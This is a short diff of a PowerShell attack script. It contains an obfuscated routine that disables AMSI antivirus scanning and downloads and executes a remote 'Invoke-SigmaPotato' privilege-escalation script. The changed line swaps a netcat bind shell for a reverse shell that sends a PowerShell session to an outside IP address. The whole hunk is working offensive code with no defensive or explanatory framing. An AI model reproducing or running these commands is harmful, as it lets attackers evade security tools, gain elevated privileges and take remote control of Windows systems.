@@ -69,4 +69,4 @@ $object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'m
 $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
-Invoke-SigmaPotato -command "c:\programdata\nc.exe -nvlp 1322 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Invoke-SigmaPotato -command "c:\programdata\nc.exe -nv 211.219.150.108 1332 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
